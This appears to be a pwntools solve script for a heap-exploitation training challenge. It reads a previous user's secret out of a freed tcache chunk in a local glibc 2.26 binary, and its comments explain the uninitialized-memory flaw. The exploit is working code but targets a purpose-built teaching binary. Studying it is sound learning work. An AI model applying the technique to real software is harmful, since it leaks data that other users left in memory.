'''
Uninitialized memory challenge. Get the previous users
secret out of memory in order to solve the challenge.
'''

from pwn import * 
import os

mode = 'DEBUG' # Turn on gdb
libc_name = '../../../libc_versions/2.26/libc-2.26.so' # For alternate version of libc
env = {}

# Binary setup
elf_name = '.uninit-2.26'

elf = ELF(elf_name)
if libc_name != '': 
	libc = ELF(libc_name)
	env = {"LD_PRELOAD": libc.path}
	
# Process creation 
if mode == 'DEBUG': 
	p = gdb.debug(elf.path, env=env, gdbscript='''
dir ../../../libc_versions/2.26/
''') 
else: 
	p = process(elf.path, env=env) 

'''
Creates a secret 

'''
def create_secret():
	p.sendlineafter(">", "1") 

'''
View A secret

Parameter:
	- index: The index of the secret to print
Returns: 
	- The output from the print
'''
def view_secret(index): 
	p.sendlineafter(">", "4")
	p.sendlineafter(">", str(index))
	p.recvuntil("Your secret:") # Right before secret output

	# Outputted data
	output = p.recvuntil(b"Welcome").replace(b"Welcome",b"") 
	return output

'''
Delete a secret 

Parameter: 
	- index: The index of the secret to remove
'''	
def delete_secret(index): 
	p.sendlineafter(">", "3")
	p.sendlineafter(">", str(index))
	return 

''' 
Set a secret
Parameters: 
	- index: The index of the secret to set
	- secret: The text to be put into the secret
'''
def set_secret(index, secret):
	p.sendlineafter(">", "2") 
	p.sendlineafter(">", str(index))
	p.sendlineafter(">", secret)
	return 

'''
Solve the exercise
Parameters: 
	- value: The secret value guess
'''
def check_flag(value):
	p.sendlineafter(">", "5") 
	p.sendlineafter("Value:", value)


'''
The struct stores the secret. The actual value is stored in `secret->value`. 
The secret struct has two unused values (filler1 and filler2). The struct is
shown below: 

```
	// The secret struct
	struct secret {
		long long filler1; 
		long long filler2; 
		char value[secrets_size];
	};
```


At the very beginning of the program, a secret is created, set and removed.
The code for this is shown below: 
```
	void* create_top_secret(){
		struct secret* my_secret = create_secret();

		...
		
		// Copying the secret to this manuall
		sprintf(my_secret->value, "%d", flag_value); 

		// Remove the secret and the end the session
		free(my_secret); 
	}

```

But, is there an issue with this? The value is never **erased**! Because 
the 'secret' is never erased, we could get the secret from the memory
if we could somehow access this. 

This is an uninitialized memory vulnerability. 

After the creation and freeing steps done above to emulate a previous user,
the chunk is put into the tcache bin. Because the 'secret' is not stored 
in the 'fd' or 'key' location, the memory is left alone and never altered. 

So, all we have to do is allocate this memory by creating a secret and read 
from there! It is key NOT to call 'set_secret' on this location; otherwise, 
the data that we want would be overwritten. 

There are two keys to this working: 
1. Secret data is not cleared
2. Secret data address it not written to

By NOT writing to the location with 'set_secret', we are making #2 happen. 
'''
create_secret()
value = view_secret(0)

# Remove the newline and nullbytes at the end
value = value[1:value.find(b"\x00")]
print("Flag: ", value)  

check_flag(value)
p.interactive()


